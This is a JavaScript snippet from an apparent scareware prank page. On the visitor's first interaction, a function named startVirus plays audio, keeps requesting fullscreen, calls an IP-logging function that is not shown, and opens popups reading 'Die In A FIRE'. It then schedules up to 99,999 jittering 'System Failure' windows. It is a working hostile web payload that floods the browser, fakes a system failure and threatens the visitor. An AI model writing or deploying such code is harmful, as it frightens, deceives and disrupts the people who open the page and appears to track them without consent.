  <script>
    let popups = [];

    function createPopup(text, xOffset) {
      const width = 300, height = 200;
      const left = Math.floor(window.screenX + (window.innerWidth / 2) + xOffset - (width / 2));
      const top = Math.floor(window.screenY + (window.innerHeight / 3) - (height / 2));
      const features = `width=${width},height=${height},left=${left},top=${top},resizable=no,scrollbars=no,status=no`;
      
      const popup = window.open("", "", features);
      if (!popup) return;

      popup.document.write(`
        <!DOCTYPE html>
        <html lang="en">
        <head>
          <meta charset="UTF-8">
          <title>${text}</title>
          <style>
            body {
              margin: 0;
              background: black;
              color: red;
              font-size: 50px;
              text-align: center;
              display: flex;
              justify-content: center;
              align-items: center;
              height: 100%;
              position: relative;
            }
            img {
              position: absolute;
              width: 150px;
              top: 50%;
              left: 50%;
              transform: translate(-50%, -50%);
            }
          </style>
        </head>
        <body>
          <img src="https://media2.giphy.com/media/l1J9QZXasDUhbX0fC/giphy.gif" alt="gif">
          <div>${text}</div>
        </body>
        </html>
      `);
      popup.document.close();
      setTimeout(() => { if (!popup.closed) popup.close(); }, 3000);
      popups.push(popup);
    }

    function triggerPopups() {
      setTimeout(() => createPopup("Die", -350), 0);
      setTimeout(() => createPopup("In A", 0), 500);
      setTimeout(() => createPopup("FIRE", 350), 1000);
      setTimeout(startShaking, 1400);
      setTimeout(spawnChaosPopups, 2400);
    }

    function startShaking() {
      setInterval(() => {
        popups.forEach(popup => {
          if (popup && !popup.closed) {
            try {
              popup.moveBy(Math.random() * 10 - 5, Math.random() * 10 - 5);
            } catch (e) {}
          }
        });
      }, 50);
    }

    function spawnChaosPopups() {
      for (let i = 0; i < 99999; i++) {
        setTimeout(() => {
          const width = 250, height = 150;
          const left = Math.floor(Math.random() * (screen.width - width));
          const top = Math.floor(Math.random() * (screen.height - height));
          const features = `width=${width},height=${height},left=${left},top=${top},resizable=no,scrollbars=no,status=no`;

          let popup = window.open("", "", features);
          if (!popup) return;

          popup.document.write(`
            <html><head><title>ERROR</title>
            <style>
              body { background:black; color:red; font-size:30px; text-align:center; }
            </style>
            </head>
            <body>WARNING!<br>System Failure!</body>
            </html>
          `);
          popup.document.close();
          popups.push(popup);
        }, i * 200);
      }
      setTimeout(startCrazyJitter, 3000);
    }

    function startCrazyJitter() {
      setInterval(() => {
        popups.forEach(popup => {
          if (popup && !popup.closed) {
            try {
              popup.moveBy(Math.random() * 20 - 10, Math.random() * 20 - 10);
            } catch (e) {}
          }
        });
      }, 30);
    }

    function requestFullscreenLoop() {
      document.documentElement.requestFullscreen().catch(err => {
        console.log("Fullscreen failed:", err);
        setTimeout(requestFullscreenLoop, 1000);
      });
    }

    function startVirus() {
      const audio = document.getElementById("audio");
      audio.currentTime = 36;
      audio.play();
      requestFullscreenLoop();
      logIp();
      setTimeout(triggerPopups, 2403);
    }

    function waitForInteraction() {
      const start = () => {
        document.removeEventListener("click", start);
        document.removeEventListener("keydown", start);
        document.removeEventListener("touchstart", start);
        startVirus();
      };
      document.addEventListener("click", start);
      document.addEventListener("keydown", start);
      document.addEventListener("touchstart", start);
    }

    window.onload = waitForInteraction;
  </script>
